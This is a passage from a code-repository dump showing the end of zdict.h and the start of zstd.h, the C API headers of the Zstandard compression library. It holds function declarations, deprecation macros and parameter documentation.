/*! ZDICT_trainFromBuffer_legacy():
 *  Train a dictionary from an array of samples.
 *  Samples must be stored concatenated in a single flat buffer `samplesBuffer`,
 *  supplied with an array of sizes `samplesSizes`, providing the size of each sample, in order.
 *  The resulting dictionary will be saved into `dictBuffer`.
 * `parameters` is optional and can be provided with values set to 0 to mean "default".
 * @return: size of dictionary stored into `dictBuffer` (<= `dictBufferCapacity`)
 *          or an error code, which can be tested with ZDICT_isError().
 *          See ZDICT_trainFromBuffer() for details on failure modes.
 *  Tips: In general, a reasonable dictionary has a size of ~ 100 KB.
 *        It's possible to select smaller or larger size, just by specifying `dictBufferCapacity`.
 *        In general, it's recommended to provide a few thousands samples, though this can vary a lot.
 *        It's recommended that total size of all samples be about ~x100 times the target size of dictionary.
 *  Note: ZDICT_trainFromBuffer_legacy() will send notifications into stderr if instructed to, using notificationLevel>0.
 */
ZDICTLIB_STATIC_API size_t ZDICT_trainFromBuffer_legacy(
    void* dictBuffer, size_t dictBufferCapacity,
    const void* samplesBuffer, const size_t* samplesSizes, unsigned nbSamples,
    ZDICT_legacy_params_t parameters);


/* Deprecation warnings */
/* It is generally possible to disable deprecation warnings from compiler,
   for example with -Wno-deprecated-declarations for gcc
   or _CRT_SECURE_NO_WARNINGS in Visual.
   Otherwise, it's also possible to manually define ZDICT_DISABLE_DEPRECATE_WARNINGS */
#ifdef ZDICT_DISABLE_DEPRECATE_WARNINGS
#  define ZDICT_DEPRECATED(message) /* disable deprecation warnings */
#else
#  define ZDICT_GCC_VERSION (__GNUC__ * 100 + __GNUC_MINOR__)
#  if defined (__cplusplus) && (__cplusplus >= 201402) /* C++14 or greater */
#    define ZDICT_DEPRECATED(message) [[deprecated(message)]]
#  elif defined(__clang__) || (ZDICT_GCC_VERSION >= 405)
#    define ZDICT_DEPRECATED(message) __attribute__((deprecated(message)))
#  elif (ZDICT_GCC_VERSION >= 301)
#    define ZDICT_DEPRECATED(message) __attribute__((deprecated))
#  elif defined(_MSC_VER)
#    define ZDICT_DEPRECATED(message) __declspec(deprecated(message))
#  else
#    pragma message("WARNING: You need to implement ZDICT_DEPRECATED for this compiler")
#    define ZDICT_DEPRECATED(message)
#  endif
#endif /* ZDICT_DISABLE_DEPRECATE_WARNINGS */

ZDICT_DEPRECATED("use ZDICT_finalizeDictionary() instead")
ZDICTLIB_STATIC_API
size_t ZDICT_addEntropyTablesFromBuffer(void* dictBuffer, size_t dictContentSize, size_t dictBufferCapacity,
                                  const void* samplesBuffer, const size_t* samplesSizes, unsigned nbSamples);


#endif   /* ZSTD_ZDICT_H_STATIC */

#if defined (__cplusplus)
}
#endif

```

`Application/Dopamine/Headers/zstd.h`:

```h
/*
 * Copyright (c) Meta Platforms, Inc. and affiliates.
 * All rights reserved.
 *
 * This source code is licensed under both the BSD-style license (found in the
 * LICENSE file in the root directory of this source tree) and the GPLv2 (found
 * in the COPYING file in the root directory of this source tree).
 * You may select, at your option, one of the above-listed licenses.
 */
#if defined (__cplusplus)
extern "C" {
#endif

#ifndef ZSTD_H_235446
#define ZSTD_H_235446

/* ======   Dependencies   ======*/
#include <limits.h>   /* INT_MAX */
#include <stddef.h>   /* size_t */


/* =====   ZSTDLIB_API : control library symbols visibility   ===== */
#ifndef ZSTDLIB_VISIBLE
   /* Backwards compatibility with old macro name */
#  ifdef ZSTDLIB_VISIBILITY
#    define ZSTDLIB_VISIBLE ZSTDLIB_VISIBILITY
#  elif defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZSTDLIB_VISIBLE __attribute__ ((visibility ("default")))
#  else
#    define ZSTDLIB_VISIBLE
#  endif
#endif

#ifndef ZSTDLIB_HIDDEN
#  if defined(__GNUC__) && (__GNUC__ >= 4) && !defined(__MINGW32__)
#    define ZSTDLIB_HIDDEN __attribute__ ((visibility ("hidden")))
#  else
#    define ZSTDLIB_HIDDEN
#  endif
#endif

#if defined(ZSTD_DLL_EXPORT) && (ZSTD_DLL_EXPORT==1)
#  define ZSTDLIB_API __declspec(dllexport) ZSTDLIB_VISIBLE
#elif defined(ZSTD_DLL_IMPORT) && (ZSTD_DLL_IMPORT==1)
#  define ZSTDLIB_API __declspec(dllimport) ZSTDLIB_VISIBLE /* It isn't required but allows to generate better code, saving a function pointer load from the IAT and an indirect jump.*/
#else
#  define ZSTDLIB_API ZSTDLIB_VISIBLE
#endif

/* Deprecation warnings :
 * Should these warnings be a problem, it is generally possible to disable them,
 * typically with -Wno-deprecated-declarations for gcc or _CRT_SECURE_NO_WARNINGS in Visual.
 * Otherwise, it's also possible to define ZSTD_DISABLE_DEPRECATE_WARNINGS.
 */
#ifdef ZSTD_DISABLE_DEPRECATE_WARNINGS
#  define ZSTD_DEPRECATED(message) /* disable deprecation warnings */
#else
#  if defined (__cplusplus) && (__cplusplus >= 201402) /* C++14 or greater */
#    define ZSTD_DEPRECATED(message) [[deprecated(message)]]
#  elif (defined(GNUC) && (GNUC > 4 || (GNUC == 4 && GNUC_MINOR >= 5))) || defined(__clang__)
#    define ZSTD_DEPRECATED(message) __attribute__((deprecated(message)))
#  elif defined(__GNUC__) && (__GNUC__ >= 3)
#    define ZSTD_DEPRECATED(message) __attribute__((deprecated))
#  elif defined(_MSC_VER)
#    define ZSTD_DEPRECATED(message) __declspec(deprecated(message))
#  else
#    pragma message("WARNING: You need to implement ZSTD_DEPRECATED for this compiler")
#    define ZSTD_DEPRECATED(message)
#  endif
#endif /* ZSTD_DISABLE_DEPRECATE_WARNINGS */


/*******************************************************************************
  Introduction

  zstd, short for Zstandard, is a fast lossless compression algorithm, targeting
  real-time compression scenarios at zlib-level and better compression ratios.
  The zstd compression library provides in-memory compression and decompression
  functions.

  The library supports regular compression levels from 1 up to ZSTD_maxCLevel(),
  which is currently 22. Levels >= 20, labeled `--ultra`, should be used with
  caution, as they require more memory. The library also offers negative
  compression levels, which extend the range of speed vs. ratio preferences.
  The lower the level, the faster the speed (at the cost of compression).

  Compression can be done in:
    - a single step (described as Simple API)
    - a single step, reusing a context (described as Explicit context)
    - unbounded multiple steps (described as Streaming compression)

  The compression ratio achievable on small data can be highly improved using
  a dictionary. Dictionary compression can be performed in:
    - a single step (described as Simple dictionary API)
    - a single step, reusing a dictionary (described as Bulk-processing
      dictionary API)

  Advanced experimental functions can be accessed using
  `#define ZSTD_STATIC_LINKING_ONLY` before including zstd.h.

  Advanced experimental APIs should never be used with a dynamically-linked
  library. They are not "stable"; their definitions or signatures may change in
  the future. Only static linking is allowed.
*******************************************************************************/

/*------   Version   ------*/
#define ZSTD_VERSION_MAJOR    1
#define ZSTD_VERSION_MINOR    5
#define ZSTD_VERSION_RELEASE  5
#define ZSTD_VERSION_NUMBER  (ZSTD_VERSION_MAJOR *100*100 + ZSTD_VERSION_MINOR *100 + ZSTD_VERSION_RELEASE)

/*! ZSTD_versionNumber() :
 *  Return runtime library version, the value is (MAJOR*100*100 + MINOR*100 + RELEASE). */
ZSTDLIB_API unsigned ZSTD_versionNumber(void);

#define ZSTD_LIB_VERSION ZSTD_VERSION_MAJOR.ZSTD_VERSION_MINOR.ZSTD_VERSION_RELEASE
#define ZSTD_QUOTE(str) #str
#define ZSTD_EXPAND_AND_QUOTE(str) ZSTD_QUOTE(str)
#define ZSTD_VERSION_STRING ZSTD_EXPAND_AND_QUOTE(ZSTD_LIB_VERSION)

/*! ZSTD_versionString() :
 *  Return runtime library version, like "1.4.5". Requires v1.3.0+. */
ZSTDLIB_API const char* ZSTD_versionString(void);

/* *************************************
 *  Default constant
 ***************************************/
#ifndef ZSTD_CLEVEL_DEFAULT
#  define ZSTD_CLEVEL_DEFAULT 3
#endif

/* *************************************
 *  Constants
 ***************************************/

/* All magic numbers are supposed read/written to/from files/memory using little-endian convention */
#define ZSTD_MAGICNUMBER            0xFD2FB528    /* valid since v0.8.0 */
#define ZSTD_MAGIC_DICTIONARY       0xEC30A437    /* valid since v0.7.0 */
#define ZSTD_MAGIC_SKIPPABLE_START  0x184D2A50    /* all 16 values, from 0x184D2A50 to 0x184D2A5F, signal the beginning of a skippable frame */
#define ZSTD_MAGIC_SKIPPABLE_MASK   0xFFFFFFF0

#define ZSTD_BLOCKSIZELOG_MAX  17
#define ZSTD_BLOCKSIZE_MAX     (1<<ZSTD_BLOCKSIZELOG_MAX)


/***************************************
*  Simple API
***************************************/
/*! ZSTD_compress() :
 *  Compresses `src` content as a single zstd compressed frame into already allocated `dst`.
 *  NOTE: Providing `dstCapacity >= ZSTD_compressBound(srcSize)` guarantees that zstd will have
 *        enough space to successfully compress the data.
 *  @return : compressed size written into `dst` (<= `dstCapacity),
 *            or an error code if it fails (which can be tested using ZSTD_isError()). */
ZSTDLIB_API size_t ZSTD_compress( void* dst, size_t dstCapacity,
                            const void* src, size_t srcSize,
                                  int compressionLevel);

/*! ZSTD_decompress() :
 *  `compressedSize` : must be the _exact_ size of some number of compressed and/or skippable frames.
 *  `dstCapacity` is an upper bound of originalSize to regenerate.
 *  If user cannot imply a maximum upper bound, it's better to use streaming mode to decompress data.
 *  @return : the number of bytes decompressed into `dst` (<= `dstCapacity`),
 *            or an errorCode if it fails (which can be tested using ZSTD_isError()). */
ZSTDLIB_API size_t ZSTD_decompress( void* dst, size_t dstCapacity,
                              const void* src, size_t compressedSize);

/*! ZSTD_getFrameContentSize() : requires v1.3.0+
 *  `src` should point to the start of a ZSTD encoded frame.
 *  `srcSize` must be at least as large as the frame header.
 *            hint : any size >= `ZSTD_frameHeaderSize_max` is large enough.
 *  @return : - decompressed size of `src` frame content, if known
 *            - ZSTD_CONTENTSIZE_UNKNOWN if the size cannot be determined
 *            - ZSTD_CONTENTSIZE_ERROR if an error occurred (e.g. invalid magic number, srcSize too small)
 *   note 1 : a 0 return value means the frame is valid but "empty".
 *   note 2 : decompressed size is an optional field, it may not be present, typically in streaming mode.
 *            When `return==ZSTD_CONTENTSIZE_UNKNOWN`, data to decompress could be any size.
 *            In which case, it's necessary to use streaming mode to decompress data.
 *            Optionally, application can rely on some implicit limit,
 *            as ZSTD_decompress() only needs an upper bound of decompressed size.
 *            (For example, data could be necessarily cut into blocks <= 16 KB).
 *   note 3 : decompressed size is always present when compression is completed using single-pass functions,
 *            such as ZSTD_compress(), ZSTD_compressCCtx() ZSTD_compress_usingDict() or ZSTD_compress_usingCDict().
 *   note 4 : decompressed size can be very large (64-bits value),
 *            potentially larger than what local system can handle as a single memory segment.
 *            In which case, it's necessary to use streaming mode to decompress data.
 *   note 5 : If source is untrusted, decompressed size could be wrong or intentionally modified.
 *            Always ensure return value fits within application's authorized limits.
 *            Each application can set its own limits.
 *   note 6 : This function replaces ZSTD_getDecompressedSize() */
#define ZSTD_CONTENTSIZE_UNKNOWN (0ULL - 1)
#define ZSTD_CONTENTSIZE_ERROR   (0ULL - 2)
ZSTDLIB_API unsigned long long ZSTD_getFrameContentSize(const void *src, size_t srcSize);

/*! ZSTD_getDecompressedSize() :
 *  NOTE: This function is now obsolete, in favor of ZSTD_getFrameContentSize().
 *  Both functions work the same way, but ZSTD_getDecompressedSize() blends
 *  "empty", "unknown" and "error" results to the same return value (0),
 *  while ZSTD_getFrameContentSize() gives them separate return values.
 * @return : decompressed size of `src` frame content _if known and not empty_, 0 otherwise. */
ZSTD_DEPRECATED("Replaced by ZSTD_getFrameContentSize")
ZSTDLIB_API
unsigned long long ZSTD_getDecompressedSize(const void* src, size_t srcSize);

/*! ZSTD_findFrameCompressedSize() : Requires v1.4.0+
 * `src` should point to the start of a ZSTD frame or skippable frame.
 * `srcSize` must be >= first frame size
 * @return : the compressed size of the first frame starting at `src`,
 *           suitable to pass as `srcSize` to `ZSTD_decompress` or similar,
 *        or an error code if input is invalid */
ZSTDLIB_API size_t ZSTD_findFrameCompressedSize(const void* src, size_t srcSize);


/*======  Helper functions  ======*/
/* ZSTD_compressBound() :
 * maximum compressed size in worst case single-pass scenario.
 * When invoking `ZSTD_compress()` or any other one-pass compression function,
 * it's recommended to provide @dstCapacity >= ZSTD_compressBound(srcSize)
 * as it eliminates one potential failure scenario,
 * aka not enough room in dst buffer to write the compressed frame.
 * Note : ZSTD_compressBound() itself can fail, if @srcSize > ZSTD_MAX_INPUT_SIZE .
 *        In which case, ZSTD_compressBound() will return an error code
 *        which can be tested using ZSTD_isError().
 *
 * ZSTD_COMPRESSBOUND() :
 * same as ZSTD_compressBound(), but as a macro.
 * It can be used to produce constants, which can be useful for static allocation,
 * for example to size a static array on stack.
 * Will produce constant value 0 if srcSize too large.
 */
#define ZSTD_MAX_INPUT_SIZE ((sizeof(size_t)==8) ? 0xFF00FF00FF00FF00LLU : 0xFF00FF00U)
#define ZSTD_COMPRESSBOUND(srcSize)   (((size_t)(srcSize) >= ZSTD_MAX_INPUT_SIZE) ? 0 : (srcSize) + ((srcSize)>>8) + (((srcSize) < (128<<10)) ? (((128<<10) - (srcSize)) >> 11) /* margin, from 64 to 0 */ : 0))  /* this formula ensures that bound(A) + bound(B) <= bound(A+B) as long as A and B >= 128 KB */
ZSTDLIB_API size_t ZSTD_compressBound(size_t srcSize); /*!< maximum compressed size in worst case single-pass scenario */
/* ZSTD_isError() :
 * Most ZSTD_* functions returning a size_t value can be tested for error,
 * using ZSTD_isError().
 * @return 1 if error, 0 otherwise
 */
ZSTDLIB_API unsigned    ZSTD_isError(size_t code);          /*!< tells if a `size_t` function result is an error code */
ZSTDLIB_API const char* ZSTD_getErrorName(size_t code);     /*!< provides readable string from an error code */
ZSTDLIB_API int         ZSTD_minCLevel(void);               /*!< minimum negative compression level allowed, requires v1.4.0+ */
ZSTDLIB_API int         ZSTD_maxCLevel(void);               /*!< maximum compression level available */
ZSTDLIB_API int         ZSTD_defaultCLevel(void);           /*!< default compression level, specified by ZSTD_CLEVEL_DEFAULT, requires v1.5.0+ */


/***************************************
*  Explicit context
***************************************/
/*= Compression context
 *  When compressing many times,
 *  it is recommended to allocate a context just once,
 *  and re-use it for each successive compression operation.
 *  This will make workload friendlier for system's memory.
 *  Note : re-using context is just a speed / resource optimization.
 *         It doesn't change the compression ratio, which remains identical.
 *  Note 2 : In multi-threaded environments,
 *         use one different context per thread for parallel execution.
 */
typedef struct ZSTD_CCtx_s ZSTD_CCtx;
ZSTDLIB_API ZSTD_CCtx* ZSTD_createCCtx(void);
ZSTDLIB_API size_t     ZSTD_freeCCtx(ZSTD_CCtx* cctx);  /* accept NULL pointer */

/*! ZSTD_compressCCtx() :
 *  Same as ZSTD_compress(), using an explicit ZSTD_CCtx.
 *  Important : in order to behave similarly to `ZSTD_compress()`,
 *  this function compresses at requested compression level,
 *  __ignoring any other parameter__ .
 *  If any advanced parameter was set using the advanced API,
 *  they will all be reset. Only `compressionLevel` remains.
 */
ZSTDLIB_API size_t ZSTD_compressCCtx(ZSTD_CCtx* cctx,
                                     void* dst, size_t dstCapacity,
                               const void* src, size_t srcSize,
                                     int compressionLevel);

/*= Decompression context
 *  When decompressing many times,
 *  it is recommended to allocate a context only once,
 *  and re-use it for each successive compression operation.
 *  This will make workload friendlier for system's memory.
 *  Use one context per thread for parallel execution. */
typedef struct ZSTD_DCtx_s ZSTD_DCtx;
ZSTDLIB_API ZSTD_DCtx* ZSTD_createDCtx(void);
ZSTDLIB_API size_t     ZSTD_freeDCtx(ZSTD_DCtx* dctx);  /* accept NULL pointer */

/*! ZSTD_decompressDCtx() :
 *  Same as ZSTD_decompress(),
 *  requires an allocated ZSTD_DCtx.
 *  Compatible with sticky parameters.
 */
ZSTDLIB_API size_t ZSTD_decompressDCtx(ZSTD_DCtx* dctx,
                                       void* dst, size_t dstCapacity,
                                 const void* src, size_t srcSize);


/*********************************************
*  Advanced compression API (Requires v1.4.0+)
**********************************************/

/* API design :
 *   Parameters are pushed one by one into an existing context,
 *   using ZSTD_CCtx_set*() functions.
 *   Pushed parameters are sticky : they are valid for next compressed frame, and any subsequent frame.
 *   "sticky" parameters are applicable to `ZSTD_compress2()` and `ZSTD_compressStream*()` !
 *   __They do not apply to "simple" one-shot variants such as ZSTD_compressCCtx()__ .
 *
 *   It's possible to reset all parameters to "default" using ZSTD_CCtx_reset().
 *
 *   This API supersedes all other "advanced" API entry points in the experimental section.
 *   In the future, we expect to remove from experimental API entry points which are redundant with this API.
 */


/* Compression strategies, listed from fastest to strongest */
typedef enum { ZSTD_fast=1,
               ZSTD_dfast=2,
               ZSTD_greedy=3,
               ZSTD_lazy=4,
               ZSTD_lazy2=5,
               ZSTD_btlazy2=6,
               ZSTD_btopt=7,
               ZSTD_btultra=8,
               ZSTD_btultra2=9
               /* note : new strategies _might_ be added in the future.
                         Only the order (from fast to strong) is guaranteed */
} ZSTD_strategy;

typedef enum {

    /* compression parameters
     * Note: When compressing with a ZSTD_CDict these parameters are superseded
     * by the parameters used to construct the ZSTD_CDict.
     * See ZSTD_CCtx_refCDict() for more info (superseded-by-cdict). */
    ZSTD_c_compressionLevel=100, /* Set compression parameters according to pre-defined cLevel table.
                              * Note that exact compression parameters are dynamically determined,
                              * depending on both compression level and srcSize (when known).
                              * Default level is ZSTD_CLEVEL_DEFAULT==3.
                              * Special: value 0 means default, which is controlled by ZSTD_CLEVEL_DEFAULT.
                              * Note 1 : it's possible to pass a negative compression level.
                              * Note 2 : setting a level does not automatically set all other compression parameters
                              *   to default. Setting this will however eventually dynamically impact the compression
                              *   parameters which have not been manually set. The manually set
                              *   ones will 'stick'. */
    /* Advanced compression parameters :
     * It's possible to pin down compression parameters to some specific values.
     * In which case, these values are no longer dynamically selected by the compressor */
    ZSTD_c_windowLog=101,    /* Maximum allowed back-reference distance, expressed as power of 2.
                              * This will set a memory budget for streaming decompression,
                              * with larger values requiring more memory
                              * and typically compressing more.
                              * Must be clamped between ZSTD_WINDOWLOG_MIN and ZSTD_WINDOWLOG_MAX.
                              * Special: value 0 means "use default windowLog".
                              * Note: Using a windowLog greater than ZSTD_WINDOWLOG_LIMIT_DEFAULT
                              *       requires explicitly allowing such size at streaming decompression stage. */
    ZSTD_c_hashLog=102,      /* Size of the initial probe table, as a power of 2.
                              * Resulting memory usage is (1 << (hashLog+2)).
                              * Must be clamped between ZSTD_HASHLOG_MIN and ZSTD_HASHLOG_MAX.
                              * Larger tables improve compression ratio of strategies <= dFast,
                              * and improve speed of strategies > dFast.
                              * Special: value 0 means "use default hashLog". */
    ZSTD_c_chainLog=103,     /* Size of the multi-probe search table, as a power of 2.
                              * Resulting memory usage is (1 << (chainLog+2)).
                              * Must be clamped between ZSTD_CHAINLOG_MIN and ZSTD_CHAINLOG_MAX.
                              * Larger tables result in better and slower compression.
                              * This parameter is useless for "fast" strategy.
                              * It's still useful when using "dfast" strategy,
                              * in which case it defines a secondary probe table.
                              * Special: value 0 means "use default chainLog". */
    ZSTD_c_searchLog=104,    /* Number of search attempts, as a power of 2.
                              * More attempts result in better and slower compression.
                              * This parameter is useless for "fast" and "dFast" strategies.
                              * Special: value 0 means "use default searchLog". */
    ZSTD_c_minMatch=105,     /* Minimum size of searched matches.
                              * Note that Zstandard can still find matches of smaller size,
                              * it just tweaks its search algorithm to look for this size and larger.
                              * Larger values increase compression and decompression speed, but decrease ratio.
                              * Must be clamped between ZSTD_MINMATCH_MIN and ZSTD_MINMATCH_MAX.
                              * Note that currently, for all strategies < btopt, effective minimum is 4.
                              *                    , for all strategies > fast, effective maximum is 6.
                              * Special: value 0 means "use default minMatchLength". */
    ZSTD_c_targetLength=106, /* Impact of this field depends on strategy.
                              * For strategies btopt, btultra & btultra2:
                              *     Length of Match considered "good enough" to stop search.
                              *     Larger values make compression stronger, and slower.
                              * For strategy fast:
                              *     Distance between match sampling.
                              *     Larger values make compression faster, and weaker.
                              * Special: value 0 means "use default targetLength". */
    ZSTD_c_strategy=107,     /* See ZSTD_strategy enum definition.
                              * The higher the value of selected strategy, the more complex it is,
                              * resulting in stronger and slower compression.
                              * Special: value 0 means "use default strategy". */
    /* LDM mode parameters */
    ZSTD_c_enableLongDistanceMatching=160, /* Enable long distance matching.
                                     * This parameter is designed to improve compression ratio
                                     * for large inputs, by finding large matches at long distance.
                                     * It increases memory usage and window size.
                                     * Note: enabling this parameter increases default ZSTD_c_windowLog to 128 MB
                                     * except when expressly set to a different value.
                                     * Note: will be enabled by default if ZSTD_c_windowLog >= 128 MB and
                                     * compression strategy >= ZSTD_btopt (== compression level 16+) */
    ZSTD_c_ldmHashLog=161,   /* Size of the table for long distance matching, as a power of 2.
                              * Larger values increase memory usage and compression ratio,
                              * but decrease compression speed.
                              * Must be clamped between ZSTD_HASHLOG_MIN and ZSTD_HASHLOG_MAX
                              * default: windowlog - 7.
                              * Special: value 0 means "automatically determine hashlog". */
    ZSTD_c_ldmMinMatch=162,  /* Minimum match size for long distance matcher.
                              * Larger/too small values usually decrease compression ratio.
                              * Must be clamped between ZSTD_LDM_MINMATCH_MIN and ZSTD_LDM_MINMATCH_MAX.
                              * Special: value 0 means "use default value" (default: 64). */
    ZSTD_c_ldmBucketSizeLog=163, /* Log size of each bucket in the LDM hash table for collision resolution.
                              * Larger values improve collision resolution but decrease compression speed.
                              * The maximum value is ZSTD_LDM_BUCKETSIZELOG_MAX.
                              * Special: value 0 means "use default value" (default: 3). */
    ZSTD_c_ldmHashRateLog=164, /* Frequency of inserting/looking up entries into the LDM hash table.
                              * Must be clamped between 0 and (ZSTD_WINDOWLOG_MAX - ZSTD_HASHLOG_MIN).
                              * Default is MAX(0, (windowLog - ldmHashLog)), optimizing hash table usage.
                              * Larger values improve compression speed.
                              * Deviating far from default value will likely result in a compression ratio decrease.
                              * Special: value 0 means "automatically determine hashRateLog". */

    /* frame parameters */
    ZSTD_c_contentSizeFlag=200, /* Content size will be written into frame header _whenever known_ (default:1)
                              * Content size must be known at the beginning of compression.
                              * This is automatically the case when using ZSTD_compress2(),
                              * For streaming scenarios, content size must be provided with ZSTD_CCtx_setPledgedSrcSize() */
    ZSTD_c_checksumFlag=201, /* A 32-bits checksum of content is written at end of frame (default:0) */
    ZSTD_c_dictIDFlag=202,   /* When applicable, dictionary's ID is written into frame header (default:1) */

    /* multi-threading parameters */
    /* These parameters are only active if multi-threading is enabled (compiled with build macro ZSTD_MULTITHREAD).
     * Otherwise, trying to set any other value than default (0) will be a no-op and return an error.
     * In a situation where it's unknown if the linked library supports multi-threading or not,
     * setting ZSTD_c_nbWorkers to any value >= 1 and consulting the return value provides a quick way to check this property.
     */
    ZSTD_c_nbWorkers=400,    /* Select how many threads will be spawned to compress in parallel.
                              * When nbWorkers >= 1, triggers asynchronous mode when invoking ZSTD_compressStream*() :
                              * ZSTD_compressStream*() consumes input and flush output if possible, but immediately gives back control to caller,
                              * while compression is performed in parallel, within worker thread(s).
                              * (note : a strong exception to this rule is when first invocation of ZSTD_compressStream2() sets ZSTD_e_end :
                              *  in which case, ZSTD_compressStream2() delegates to ZSTD_compress2(), which is always a blocking call).
                              * More workers improve speed, but also increase memory usage.
                              * Default value is `0`, aka "single-threaded mode" : no worker is spawned,
                              * compression is performed inside Caller's thread, and all invocations are blocking */
    ZSTD_c_jobSize=401,      /* Size of a compression job. This value is enforced only when nbWorkers >= 1.
                              * Each compression job is completed in parallel, so this value can indirectly impact the nb of active threads.
                              * 0 means default, which is dynamically determined based on compression parameters.
                              * Job size must be a minimum of overlap size, or ZSTDMT_JOBSIZE_MIN (= 512 KB), whichever is largest.
                              * The minimum size is automatically and transparently enforced. */
    ZSTD_c_overlapLog=402,   /* Control the overlap size, as a fraction of window size.
                              * The overlap size is an amount of data reloaded from previous job at the beginning of a new job.
                              * It helps preserve compression ratio, while each job is compressed in parallel.
                              * This value is enforced only when nbWorkers >= 1.
                              * Larger values increase compression ratio, but decrease speed.
                              * Possible values range from 0 to 9 :
                              * - 0 means "default" : value will be determined by the library, depending on strategy
                              * - 1 means "no overlap"
                              * - 9 means "full overlap", using a full window size.
                              * Each intermediate rank increases/decreases load size by a factor 2 :
                              * 9: full window;  8: w/2;  7: w/4;  6: w/8;  5:w/16;  4: w/32;  3:w/64;  2:w/128;  1:no overlap;  0:default
                              * default value varies between 6 and 9, depending on strategy */

    /* note : additional experimental parameters are also available
     * within the experimental section of the API.
     * At the time of this writing, they include :
     * ZSTD_c_rsyncable
     * ZSTD_c_format
     * ZSTD_c_forceMaxWindow
     * ZSTD_c_forceAttachDict
     * ZSTD_c_literalCompressionMode
     * ZSTD_c_targetCBlockSize
     * ZSTD_c_srcSizeHint
     * ZSTD_c_enableDedicatedDictSearch
     * ZSTD_c_stableInBuffer
     * ZSTD_c_stableOutBuffer
     * ZSTD_c_blockDelimiters
     * ZSTD_c_validateSequences
     * ZSTD_c_useBlockSplitter
     * ZSTD_c_useRowMatchFinder
     * ZSTD_c_prefetchCDictTables
     * ZSTD_c_enableSeqProducerFallback
     * ZSTD_c_maxBlockSize
     * Because they are not stable, it's necessary to define ZSTD_STATIC_LINKING_ONLY to access them.
     * note : never ever use experimentalParam? names directly;
     *        also, the enums values themselves are unstable and can still change.
     */
     ZSTD_c_experimentalParam1=500,
     ZSTD_c_experimentalParam2=10,
     ZSTD_c_experimentalParam3=1000,
     ZSTD_c_experimentalParam4=1001,
     ZSTD_c_experimentalParam5=1002,
     ZSTD_c_experimentalParam6=1003,
     ZSTD_c_experimentalParam7=1004,
     ZSTD_c_experimentalParam8=1005,
     ZSTD_c_experimentalParam9=1006,
     ZSTD_c_experimentalParam10=1007,
     ZSTD_c_experimentalParam11=1008,
     ZSTD_c_experimentalParam12=1009,
     ZSTD_c_experimentalParam13=1010,
     ZSTD_c_experimentalParam14=1011,
     ZSTD_c_experimentalParam15=1012,
     ZSTD_c_experimentalParam16=1013,
     ZSTD_c_experimentalParam17=1014,
     ZSTD_c_experimentalParam18=1015,
     ZSTD_c_experimentalParam19=1016
} ZSTD_cParameter;

typedef struct {
    size_t error;
    int lowerBound;
    int upperBound;
} ZSTD_bounds;

/*! ZSTD_cParam_getBounds() :
 *  All parameters must belong to an interval with lower and upper bounds,
 *  otherwise they will either trigger an error or be automatically clamped.
 * @return : a structure, ZSTD_bounds, which contains
 *         - an error status field, which must be tested using ZSTD_isError()
 *         - lower and upper bounds, both inclusive
 */
ZSTDLIB_API ZSTD_bounds ZSTD_cParam_getBounds(ZSTD_cParameter cParam);

/*! ZSTD_CCtx_setParameter() :
 *  Set one compression parameter, selected by enum ZSTD_cParameter.
 *  All parameters have valid bounds. Bounds can be queried using ZSTD_cParam_getBounds().
 *  Providing a value beyond bound will either clamp it, or trigger an error (depending on parameter).
 *  Setting a parameter is generally only possible during frame initialization (before starting compression).
 *  Exception : when using multi-threading mode (nbWorkers >= 1),
 *              the following parameters can be updated _during_ compression (within same frame):
 *              => compressionLevel, hashLog, chainLog, searchLog, minMatch, targetLength and strategy.
 *              new parameters will be active for next job only (after a flush()).
 * @return : an error code (which can be tested using ZSTD_isError()).
 */
ZSTDLIB_API size_t ZSTD_CCtx_setParameter(ZSTD_CCtx* cctx, ZSTD_cParameter param, int value);

/*! ZSTD_CCtx_setPledgedSrcSize() :
 *  Total input data size to be compressed as a single frame.
 *  Value will be written in frame header, unless if explicitly forbidden using ZSTD_c_contentSizeFlag.
 *  This value will also be controlled at end of frame, and trigger an error if not respected.
 * @result : 0, or an error code (which can be tested with ZSTD_isError()).
 *  Note 1 : pledgedSrcSize==0 actually means zero, aka an empty frame.
 *           In order to mean "unknown content size", pass constant ZSTD_CONTENTSIZE_UNKNOWN.
 *           ZSTD_CONTENTSIZE_UNKNOWN is default value for any new frame.
 *  Note 2 : pledgedSrcSize is only valid once, for the next frame.
 *           It's discarded at the end of the frame, and replaced by ZSTD_CONTENTSIZE_UNKNOWN.
 *  Note 3 : Whenever all input data is provided and consumed in a single round,
 *           for example with ZSTD_compress2(),
 *           or invoking immediately ZSTD_compressStream2(,,,ZSTD_e_end),
 *           this value is automatically overridden by srcSize instead.
 */
ZSTDLIB_API size_t ZSTD_CCtx_setPledgedSrcSize(ZSTD_CCtx* cctx, unsigned long long pledgedSrcSize);

typedef enum {
    ZSTD_reset_session_only = 1,
    ZSTD_reset_parameters = 2,
    ZSTD_reset_session_and_parameters = 3
} ZSTD_ResetDirective;

/*! ZSTD_CCtx_reset() :
 *  There are 2 different things that can be reset, independently or jointly :
 *  - The session : will stop compressing current frame, and make CCtx ready to start a new one.
 *                  Useful after an error, or to interrupt any ongoing compression.
 *                  Any internal data not yet flushed is cancelled.
 *                  Compression parameters and dictionary remain unchanged.
 *                  They will be used to compress next frame.
 *                  Resetting session never fails.
 *  - The parameters : changes all parameters back to "default".
 *                  This also removes any reference to any dictionary or external sequence producer.
 *                  Parameters can only be changed between 2 sessions (i.e. no compression is currently ongoing)
 *                  otherwise the reset fails, and function returns an error value (which can be tested using ZSTD_isError())
 *  - Both : similar to resetting the session, followed by resetting parameters.
 */
ZSTDLIB_API size_t ZSTD_CCtx_reset(ZSTD_CCtx* cctx, ZSTD_ResetDirective reset);

/*! ZSTD_compress2() :
 *  Behave the same as ZSTD_compressCCtx(), but compression parameters are set using the advanced API.
 *  ZSTD_compress2() always starts a new frame.
 *  Should cctx hold data from a previously unfinished frame, everything about it is forgotten.
 *  - Compression parameters are pushed into CCtx before starting compression, using ZSTD_CCtx_set*()
 *  - The function is always blocking, returns when compression is completed.
 *  NOTE: Providing `dstCapacity >= ZSTD_compressBound(srcSize)` guarantees that zstd will have
 *        enough space to successfully compress the data, though it is possible it fails for other reasons.
 * @return : compressed size written into `dst` (<= `dstCapacity),
 *           or an error code if it fails (which can be tested using ZSTD_isError()).
 */
ZSTDLIB_API size_t ZSTD_compress2( ZSTD_CCtx* cctx,
                                   void* dst, size_t dstCapacity,
                             const void* src, size_t srcSize);


/***********************************************
*  Advanced decompression API (Requires v1.4.0+)
************************************************/

/* The advanced API pushes parameters one by one into an existing DCtx context.
